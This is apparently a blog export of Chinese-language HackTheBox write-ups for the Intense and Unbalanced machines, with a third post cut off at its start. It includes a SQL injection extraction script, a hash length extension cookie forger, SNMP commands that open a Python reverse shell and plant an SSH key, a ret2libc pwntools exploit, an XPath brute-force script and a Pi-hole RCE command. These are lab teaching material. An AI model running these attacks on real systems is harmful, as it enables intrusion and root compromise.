HackTheBox","slug":"Intense-HackTheBox","date":"2020-09-01T06:00:58.000Z","updated":"2020-11-16T00:39:31.708Z","comments":true,"path":"2020/09/01/Intense-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/09/01/Intense-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/261 10.10.10.195 端口扫描 常规22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.195Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 13:01 CSTNmap scan report for 10.10.10.195Host is up (0.072s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 b4:7b:bd:c0:96:9a:c3:d0:77:80:c8:87:c6:2e:a2:2f (RSA)| 256 44:cb:fe:20:bb:8d:34:f2:61:28:9b:e8:c7:e9:7b:5e (ECDSA)|_ 256 28:23:8c:e2:da:54:ed:cb:82:34:a1:e3:b2:2d:04:ed (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Intense - WebApp161/tcp closed snmpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.48 seconds 80是一个开源系统，提供了guest账号密码： guest登录后可以提交feedback： 代码分析提供了源码： http://10.10.10.195/src.zip 下载下来分析,很明显是Flask： admin.py判断权限，然后log view和list功能： app.py主要就是登录登出以及submit功能，submit会判断长度以及过滤一些字符，然后insert，这里可以注入，需要bypass过滤，sqlite3数据库： lwt.py主要是session，签名，验证之类的： utils.py登录处理，权限判断，以及log之类的一些： cookie根据代码可以知道cookie是session加sig，解析后是这样： SQL注入sqlite3注入，参考资料： [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/SQLite Injection.md) Boolean Extract Info1&quot;&#39;AND (SELECT CASE WHEN ((SELECT substr(secret,&quot;+str(i+1)+&quot;,1) FROM users WHERE role&#x3D;1) &#x3D; &#39;&quot;+c+&quot;&#39;) THEN 1 ELSE MATCH(1,1) END))--&quot; 1username&#x3D;guest;secret&#x3D;84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec 提示不能使用MATCH，这意思是无法match Admin用户secret的确切长度，我们需要一个循环脚本，guest的secret长度是64，我们需要循环直到64，尚未match完成就会得到这个响应，通过sql注入获取admin的secret： 1[+] Admin Secret: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 现在我们有admin的secret，但还需要解决sign问题 admin-secret-sqli.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# query_db(\"insert into messages values ('%s')\" % message) -&gt; get secret of admin# admin role = 1 import requestsimport timefrom datetime import datetimetarget = \"http://10.10.10.195\"#phase one, getting connection and logindef get_cooks(): sesh = requests.Session() res = sesh.post(target + \"/postlogin\", data = &#123;\"username\": \"guest\", \"password\": \"guest\"&#125;) return sesh.cookies[\"auth\"]cookie = get_cooks()#phase two, submit a messagedef submit(load): f = requests.post(target + \"/submitmessage\", data = &#123; \"message\" : load &#125;, cookies = &#123; \"auth\" : cookie &#125;) return f.text# reference: https://www.sqlitetutorial.net/sqlite-case/ &amp; https://www.sqlite.org/lang_expr.htmldef check(): print(\"[+] Checking admin Secret\") time.sleep(5) for x in range (0,256): load = \"' AND (select CASE WHEN ( (select length(secret) from users where role=1) = &#123;&#125; ) then match(1,1) END ))--\".format(str(x)) c = \"[+] Response: &#123;&#125;\".format(submit(load)) if 'unable' in c: print(\"[+] Attempted number: &#123;&#125;\".format(str(x))) print(\"[+] Admin secret length: &#123;&#125;\".format(str(x))) break # [+] Attempt number: 64#[+] Response: unable to use function MATCH in the requested contextdef get_database(): print(\"[+] Performing HEIST \\n\") now = datetime.now() current_time = now.strftime(\"%H:%M:%S\") print(\"started at: &#123;&#125;\".format(str(current_time))) time.sleep(5) secrets = \"\" for lengths in range (0,67): for chars in range(47, 122): load = \"' AND (select CASE WHEN ( (SELECT hex(substr(secret,&#123;a&#125;,1)) FROM users WHERE role=1) = hex('&#123;b&#125;') ) then match(1,1) END ))--\".format(a=str(lengths),b=str(chr(chars))) c = \"[+] Response: &#123;&#125;\".format(submit(load)) if 'unable' in c: print(\"[+] Attempt no: &#123;&#125;\".format(str(lengths))) secrets += str(chr(chars)) print(secrets + '\\n') if len(secrets) == 64: print(\"[+] Attempt number: &#123;&#125;\".format(str(lengths))) print(\"[+] Admin Secret: &#123;&#125;\".format(secrets)) now = datetime.now() current_time = now.strftime(\"%H:%M:%S\") print(\"end time: &#123;&#125;\".format(str(endy))) else: pass print('')check()get_database()#\"' and (SELECT hex(substr(tbl_name,&#123;a&#125;,1)) FROM users WHERE role=1 and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')\"#\"' AND (select CASE WHEN ( (SELECT hex(substr(secret,&#123;a&#125;,1)) FROM users WHERE role=1) = hex('&#123;b&#125;')) ) then match(1,1) END ))--\" 哈希长度扩展攻击sign是直接这样的，可以使用哈希长度扩展攻击： 123def sign(msg): &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot; return sha256(SECRET + msg).digest() 参考资料： Everything you need to know about hash length extension attacks » SkullSecurityhttps://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks Hashpump1pip2 install hashpumpy 可以直接使用Hashpump，因为从代码里知道sig用的secret是SECRET = os.urandom(randrange(8, 15))，这样的不定长度，我们需要循环判断, 最终得到admin cookie： 12[+] FOUNDadmin cookie: dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwA7dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7.0CuwS&#x2F;U8jtfL33f1MvSD8u5PBphquWkc4xJZYnN6HiA&#x3D; 替换cookie，现在我们是admin： ##Hashpump.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from base64 import b64decode, b64encodeimport osimport hashpumpyimport binasciiimport requests#We know the guest data : (b'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;')#We know the guest signature : (b'\\xf2\\x02\\x86\\xc9\\xa5\\xb3\\x14\\x1eO\\x8cf4h(\\xce\\xd5|\\xec2f\\x04~\\xf3W&#123;\\x0f\\xef\\xf5\\rq\\xfe%') and it's length 32.#We can perform Hash extension attack.#Replace the admin secret belowform_1 = ';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'#This part will be readable part in cookie, the rest is we have to find by using the length we found in Guest's cookietarget = \"http://10.10.10.195\"def get_cookie(): session = requests.Session() res = session.post(target + \"/postlogin\", data = &#123;\"username\": \"guest\", \"password\": \"guest\"&#125;) return session.cookies[\"auth\"]cookie = get_cookie()(b64_data, b64_sig) = cookie.split('.')data = b64decode(b64_data)sig = b64decode(b64_sig)print('################## The First part')print('data = ' + str(data) + '\\n')print('################## The Second part')print('sig = ' + str(sig) + '\\n')#Hashpumpy Module to perform Hash extension Attack.for i in range(1, 50): (sigma, datum) = hashpumpy.hashpump(sig.encode('hex'), data, form_1, i) print (\"Sigma= \" + sigma) print (\"Datum= \" + datum) dat1 = b64encode(datum).decode('utf-8') sig1 = b64encode(binascii.unhexlify(sigma)).decode('utf-8') print (\"Sig1= \" + sig1) print (\"Dat1= \" + dat1) cookie = dat1 + \".\" + sig1 print(\"cookie: &#123;&#125;\".format(i)) print(cookie + '\\n') req = requests.get(target + \"/admin\", cookies = &#123; \"auth\" : cookie &#125;) if \"Forbidden\" not in req.text: print(\"[+] FOUND\") print(\"admin cookie: \" + str(cookie)) break admin根据代码我们知道admin有log view和list功能，页面上没有入口，我们可以直接去访问接口,然后存在目录遍历以及任意文件读取(注意点：如果无法获得内容，加个headerContent-Type: application/x-www-form-urlencoded)： 注意得到的用户，可以知道有snmp user flag直接利用任意文件读取即可得到user.txt: SNMP前面知道有snmp，那么就读取snmp配置文件,可以得到RWcommunity： 然后根据这篇文章，SNMP任意命令执行： SNMP Arbitrary Command Execution. SNMP, the Simple Network Management… | by Kert Ojasoo | The RangeForce CyberSecurity Blog | Mediumhttps://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e snmpset如果运行出错的话，先运行这几条 123sudo apt-get install snmp-mibs-downloadersudo download-mibssudo echo \"\" &gt; /etc/snmp/snmp.conf 123snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 &#39;nsExtendStatus.&quot;evilcommand&quot;&#39; &#x3D; createAndGo &#39;nsExtendCommand.&quot;evilcommand&quot;&#39; &#x3D; &#x2F;usr&#x2F;bin&#x2F;python3 &#39;nsExtendArgs.&quot;evilcommand&quot;&#39; &#x3D; &#39;-c &quot;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((\\&quot;10.10.14.18\\&quot;,4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\&quot;&#x2F;bin&#x2F;sh\\&quot;)&quot;&#39;snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2 debian-snmp-shell.sh可以脚本自动一套： 1234567#!/bin/bashrandom=\"gunroot\"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \\ \"nsExtendStatus.\\\"$&#123;random&#125;\\\"\" = createAndGo \\ \"nsExtendCommand.\\\"$&#123;random&#125;\\\"\" = /usr/bin/python3 \\ \"nsExtendArgs.\\\"$&#123;random&#125;\\\"\" = '-c \"import sys,socket,os,pty;s=socket.socket();s.connect((\\\"10.10.14.18\\\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/sh\\\")\"'snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2 note_server服务器5001端口以root权限跑着一个note_server，分析调试过程详细参考官方wp视频： HackTheBox - Intense - YouTubehttps://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec ret2libc转发端口，ret2libc得到root shell tunnel.sh有防火墙，ssh连接后秒断，但可以ssh转发端口： 1234567891011#!/bin/bashssh-keygen -b 2048 -t ed25519 -f ./key -q -N \"\"key=$(cat key.pub)shitvalue=\"lkabeahbf\"snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \\ \"nsExtendStatus.\\\"$&#123;shitvalue&#125;\\\"\" = createAndGo \\ \"nsExtendCommand.\\\"$&#123;shitvalue&#125;\\\"\" = /bin/bash \\ \"nsExtendArgs.\\\"$&#123;shitvalue&#125;\\\"\" = \"-c \\\"echo $&#123;key&#125; &gt;&gt; ~/.ssh/authorized_keys\\\"\"snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i key pwn_server.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#!/usr/bin/env pythonfrom pwn import *context(os='linux', arch='amd64')host = '127.0.0.1'port = 5001fd = 4def write_note(io, note, length=None): if length is None: length = len(note) io.send(p8(1)) io.send(p8(length)) io.send(note)def copy_note(io, offset, copySize): io.send(p8(2)) io.send(p16(offset)) io.send(p8(copySize))def read_notes(io, size=None): io.send(p8(3)) if size is None: recv = io.recvall() else: recv = io.recv(size) return recvdef write_to_end(io, written=0): g = cyclic_gen() while written &lt; 1024: chunk = min(255, 1024 - written) write_note(io, g.get(chunk)) written += chunkdef do_rop(io, canary, rbp, rop): buf = p64(0xDEAD) buf += p64(canary) buf += p64(rbp) buf += rop.chain() write_note(io, buf) write_to_end(io, len(buf)) copy_note(io, 0, len(buf)) read_notes(io, 1024 + len(buf))def stage1(): # stack canary + ebp io = remote(host,port) write_to_end(io) read_size = 4*8 copy_note(io, 1024, read_size) leak = read_notes(io, 1024+read_size)[1024:] canary = u64(leak[8:16]) rbp = u64(leak[16:24]) rip = u64(leak[24:]) print(\"\\nleaks:\") print(\"rbp = \", hex(rbp)) print(\"canary = \", hex(canary)) print(\"rip = \", hex(rip)) io.close() return (rbp, canary, rip)def stage2(rbp, canary, rip): # leaking libc base_address = rip - 0xf54 # https://www.youtube.com/watch?v=GTQxZlr5yvE&amp;t=2h14m38s elf = ELF(\"./note_server\", checksec=False) elf.address = base_address rop = ROP(elf) rop.write(fd, elf.got[\"write\"]) io = remote(host, port) do_rop(io, canary, rbp, rop) leak = io.recv(8) libc_write = u64(leak) print(\"\\nlibc leak: \" + hex(libc_write)) io.close() return libc_writedef stage3(canary, rbp, libc_write_leak): # get the last 3 bytes and enter them on https://libc.blukat.me # then download the libc and set the path here elf_libc = ELF(\"./libc6_2.27-3ubuntu1_amd64.so\", checksec=False) elf_libc.address = libc_write_leak - elf_libc.symbols['write'] rop_libc = ROP(elf_libc) rop_libc.dup2(fd, 0) rop_libc.dup2(fd, 1) rop_libc.execve(next(elf_libc.search(b\"/bin/sh\\x00\")), 0, 0) io = remote(host, port) do_rop(io, canary, rbp, rop_libc) io.interactive()(rbp, canary, rip) = stage1()libc_write_leak = stage2(rbp, canary, rip)stage3(canary, rbp, libc_write_leak) 参考资料 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/SQLite Injection.md) Everything you need to know about hash length extension attacks » SkullSecurityhttps://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks https://github.com/bwall/HashPump SNMP Arbitrary Command Execution. SNMP, the Simple Network Management… | by Kert Ojasoo | The RangeForce CyberSecurity Blog | Mediumhttps://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e Doing ret2libc with a Buffer Overflow because of restricted return pointer - bin 0x0F - YouTubehttps://www.youtube.com/watch?v=m17mV24TgwY HackTheBox - Intense 10.10.10.195 - WriteUp - BinaryBicepshttps://binarybiceps.com/hackthebox-intense-writeup/?ppwp=1 HackTheBox - Intense - YouTubehttps://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Unbalanced  - HackTheBox","slug":"Unbalanced-HackTheBox","date":"2020-08-20T07:18:28.000Z","updated":"2020-12-07T00:44:33.095Z","comments":true,"path":"2020/08/20/Unbalanced-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/20/Unbalanced-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/268 10.10.10.200 端口扫描22,873,3128 1234567891011121314151617181920$ nmap -sC -sV 10.10.10.200Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 13:26 CSTNmap scan report for 10.10.10.200Host is up (0.078s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)| 256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)|_ 256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)873/tcp open rsync (protocol version 31)3128/tcp open http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrievedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds 873 rsync873是rsync端口，未授权访问，可以下载文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485$ rsync rsync://10.10.10.200conf_backups EncFS-encrypted configuration backups$ rsync -av rsync://10.10.10.200/conf_backups filesreceiving file list ... donecreated directory files./,CBjPJW4EGlcqwZW4nmVqBA6-FjZ6-6,Fa,tMvlDsuVAO7ek.encfs6.xml0K72OfkNRRx3-f0Y6eQKwnjn27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-2VyeljxHWrDX37La6FhUGIJS3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C13cdBkrRF7R5bYe1ZJ0KYy7863xB4vSQH-HKVcOMQIs02Qb9,4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC15-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,5FTRnQDoLdRfOEPkrhM2L29P5IUA28wOw0wwBs8rP5xjkFSs6R1rXixtFRQ5c9ScY8MBQ1Rg7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN18CBL-MBKTDMgB6AT2nfWfq-e8XDA,IOhFFlhh120yl54Q0da8e6TAzw0xs2LVxgohuXHhWjM9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0A4qOD1nvqe9JgKnslwk1sUzOAcv0PEQX8vs-KdK307QNHaiFB6J5M3OP0X7W25ITnaZX753TChlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1ECXONXBBRwhb5tYOIcjjFZzhF4F9opY2nhVVnRgiQ,OUs-Y0FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1FSXWRSwW6vOvJ0ExPK0fXJ6FIymL3QugM,XxLuKEdwJJOOpiKPYfvxIoOlrRjTY18zi8Wne-Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0Kpo3MHQxksW2uYX79XngQu-fKtFc,DR7HqmGdPOkM2CpLaM9Mv5TtpmUNnVl-fgqQeYAy8uuMxgjShAeN6AmkH2tQAsfaj6CNi8LDatT134DF6hhQf5ESpo5Nlne5rpWkOxkPNC15SEeJ8g,OFG2vAoaW3Tvv1X2J5fy4UV8OvBqims-kvgGyJJqZ59IbGfyStlxkG05UY9zWNHBhXxukuP9TZGfSHeAM42o9TgjGUdOSdrdVQjGnKU1puKhF6pQG1aah6rcW5,ILrUB4dBVW-Jby5AUcGszWr0grx0GnkLFl8qT3L0CyTE6X93-uArUSTL,kiJpOeovWTaPYa30M5le2NKbF6rD-qD3M-7tYw0UEJYKN,Hjf-QGqo3WObHyZ8,hYzUjW0GnBk1JP,8ghCsCZXUUpn9SCTerl0dinZQYwxrxZvkMNEBKPRpOHbGoefPa737Ta4zdmLrBYDC24s9Z59y-Pwa2c9w3APbCYWfWLsq7NFOdjQpAcwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1dF2GU58wFl3x5R7aDE6QEnDjdNTEvgsjgG6lKBr8ev8Dw,p7gK5Z2BBMSh9iFyCFfIthbkQ6gRhKiGIEm4SvYkTCLlOQPeh-hqZXaSCJi-Jso02DJlwCtYoziaDKfUAHJmdqTDVZsmCIS,BnjIY9q65HMBxJqUW48LJIc,FjkdJ5whfqyrkk6avAhlX-x0khkheep9TIpbbdwNSfmNU1QNk-l,LY6YoFepcaLg67YoILNGg0lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,mMGincizgMjpsBjkhWq-Oy0DoPu0EVyHA6,KmoI1T,LTs83xpfTT,nZnCUFzyPPOeX9NwQVopn6YPUx69xqxRXKqg5B5D2ONq5RFgoRK2Ttl3U5W8fjtyriXqeHNkZencKDjkr3R746ZzO5KsNiR-scp-DZrXHg4coa9KBmZsfT89u8dsEY4n99lNsUFOwkiuEtPZwC2tjaQELJmnNRTCLYUvCsXjR1qQmPO5g3P3kiFyO84waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5sent 1672 bytes received 411883 bytes 35961.30 bytes/sectotal size is 405603 speedup is 0.98 这是EncFS加密后的文件： https://github.com/vgough/encfs 3128 proxy3128是一个代理，直接访问是错误页面： 将其作为代理使用： EncFS解密密码解密需要密码，可以使用john： 12345678910111213python /usr/share/john/encfs2john.py files/ &gt; encfs6.xml.johnsudo john --wordlist=/usr/share/wordlists/rockyou.txt encfs6.xml.john[sudo] password for miao:Using default input encoding: UTF-8Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])Cost 1 (iteration count) is 580280 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusbubblegum (files/)1g 0:00:00:17 DONE (2020-08-19 10:53) 0.05707g/s 41.09p/s 41.09c/s 41.09C/s bambam..marissaUse the \"--show\" option to display all of the cracked passwords reliablySession completed 得到解密密码是bubblegum 解密文件123456sudo apt-get install encfsencfsctl export files decryptEncFS Password:directory decrypt does not exist.The directory \"decrypt\" does not exist. Should it be created? (y,N) Y 解密后的文件是各种配置文件： squid.conf在squid.conf中找到一个域名和密码： 12intranet.unbalanced.htbThah$Sh1 squid通过squid，我们可以得到更多信息 123456789101112131415161718192021222324252627282930313233sudo apt install squidclientsquidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:fqdncacheHTTP/1.1 200 OKServer: squid/4.6Mime-Version: 1.0Date: Thu, 20 Aug 2020 05:53:53 GMTContent-Type: text/plain;charset=utf-8Expires: Thu, 20 Aug 2020 05:53:53 GMTLast-Modified: Thu, 20 Aug 2020 05:53:53 GMTX-Cache: MISS from unbalancedX-Cache-Lookup: MISS from unbalanced:3128Via: 1.1 unbalanced (squid/4.6)Connection: closeFQDN Cache Statistics:FQDNcache Entries In Use: 9FQDNcache Entries Cached: 8FQDNcache Requests: 94FQDNcache Hits: 0FQDNcache Negative Hits: 0FQDNcache Misses: 94FQDN Cache Contents:Address Flg TTL Cnt Hostnames127.0.1.1 H -001 2 unbalanced.htb unbalanced::1 H -001 3 localhost ip6-localhost ip6-loopback172.31.179.2 H -001 1 intranet-host2.unbalanced.htb172.31.179.3 H -001 1 intranet-host3.unbalanced.htb127.0.0.1 H -001 1 localhost172.17.0.1 H -001 1 intranet.unbalanced.htbff02::1 H -001 1 ip6-allnodesff02::2 H -001 1 ip6-allrouters intranet根据squid配置文件得到的一些域名,可以猜到这是类似负载均衡，第一个域名就是172.31.179.1： 123intranet.unbalanced.htb172.31.179.2 H -001 1 intranet-host2.unbalanced.htb172.31.179.3 H -001 1 intranet-host3.unbalanced.htb 直接通过代理访问ip得到： 配置hosts： 123172.31.179.1 intranet.unbalanced.htb172.31.179.2 intranet-host2.unbalanced.htb172.31.179.3 intranet-host3.unbalanced.htb 然后通过域名去访问，是一个登录页面： 这时候把域名换成ip就可以正常访问了，后面路径正确： X-Path注入简单尝试可以发现有明显的注入，但不是SQL注入，而是X-Path注入,最简单的payload即可，得到一部分信息： 参考资料： [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH Injection) bruteforce之后就是根据得到的用户信息，通过xpath注入爆破，得到结果： 1234rita:password01!jim:stairwaytoheavenbryan:ireallyl0vebubblegum!!!sarah:sarah4evah 爆破脚本12345678910111213141516171819202122import requestsurl = \"http://172.31.179.1/intranet.php\"proxy = \"http://10.10.10.200:3128\"letters = \"abcdefghijklmnopqrstuvwxyz0123456789!@#$%\"users = ['sarah', 'rita', 'jim', 'bryan']for user in users: data = &#123;\"Username\": '', \"Password\": \"' or username= '\" + user + \"'or substring(Password,1,1)='p' or'\"&#125; request = requests.post(url, data=data, proxies=&#123;'http':proxy&#125;) length = len(request.text) p4ss = '' for i in range(1,25): for l in letters: data = &#123;\"Username\": '', \"Password\": \"' or username= '\" + \"&#123;&#125;\".format(user) + \"'or substring(Password,&#123;&#125;,1)='&#123;&#125;' or'\".format(str(i),l)&#125; request1 = requests.post(url, data=data, proxies=&#123;'http':proxy&#125;) if \"&#123;&#125;@unbalanced.htb\".format(user) in request1.text and len(request1.text) != 6756: print(\"Got hit for User '&#123;&#125;' - Letter is '&#123;&#125;'\".format(user, l)) p4ss += l print(str(i)) print(str(p4ss)) pass user flag上面爆破得到的账号密码，bryan的可以ssh登录，得到user.txt: 搜集信息12345678910111213141516171819202122bryan@unbalanced:~$ cat TODO############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO] 注意这一行,下一步的提示： 1Create Pi-hole configuration script [IN PROGRESS] 使用 linpeas之类的可以得到一些docker的ip地址： 123456172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE10.10.10.2 dev ens160 lladdr 00:50:56:b9:f9:ab REACHABLEfe80::250:56ff:feb9:f9ab dev ens160 lladdr 00:50:56:b9:f9:ab router STALE 172.31.11.3是Pi-hole: 123456bryan@unbalanced:~$ curl 172.31.11.3 &lt;html&gt;&lt;head&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/&gt; &lt;link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/&gt; &lt;/head&gt;&lt;body id='splashpage'&gt;&lt;img src='/admin/img/logo.svg'/&gt;&lt;br/&gt;Pi-&lt;b&gt;hole&lt;/b&gt;: Your black hole for Internet advertisements&lt;br&gt;&lt;a href='/admin'&gt;Did you mean to go to the admin panel?&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 可以在外部通过代理访问： Pi-hole搜索能够得到一个需要认证的RCE： Pi-hole &lt; 4.4 - Authenticated Remote Code Execution - Linux webapps Exploithttps://www.exploit-db.com/exploits/48442 直接使用默认密码admin即可登录： 端口转发因为exp没有配置代理选项，而这个pihole是需要通过代理访问的，我们可以把端口转发出来方便操作： 1ssh -L 8181:172.31.11.3:80 bryan@10.10.10.200 然后访问我们本机的8181端口就相当于访问远程pihole： rce然后就是exp直接打，反弹shell： exp用的这个： https://github.com/AndreyRainchik/CVE-2020-8816 1python CVE-2020-8816.py http://127.0.0.1:8181 admin 10.10.14.17 9999 得到www-root的shell： pihole_config.sh然后在/root目录下有个配置文件，在里面有一个密码： 1234567891011121314151617181920212223242526$ cd /root$ lsph_install.shpihole_config.sh$ cat pihole_config.sh#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced.htb/usr/local/bin/pihole -w rebalanced.htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c# Add local host record/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'# Set admin email/usr/local/bin/pihole -a email admin@unbalanced.htb$ root txt上面得到的密码就是root密码，外部直接切到root，得到root.txt: 1bUbBl3gUm$43v3Ry0n3! 参考资料 https://github.com/vgough/encfs [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH Injection) Pi-hole &lt; 4.4 - Authenticated Remote Code Execution - Linux webapps Exploithttps://www.exploit-db.com/exploits/48442 https://github.com/AndreyRainchik/CVE-2020-8816 Hack-The-Box-walkthrough[Unbalanced] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2020/08/17/Unbalanced/ HackTheBox - Unbalanced 10.10.10.200 - WriteUp - BinaryBicepshttps://binarybiceps.com/hackthebox-unbalanced-writeup/?ppwp=1#Privilege_Escalation_%E2%80%93_Information_Disclosure_%E2%80%93_Root","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Travel - HackTheBox","slug":"Travel-HackTheBox","date":"2020-08-19T05:46:48.000Z","updated":"2020-09-14T00:32:41.202Z","comments":true,"path":"2020/08/19/Travel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/19/Travel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/252 10.10.10.189 端口扫描常规的22，80，443 12345678910111213141516171819202122$ nmap -sC -sV 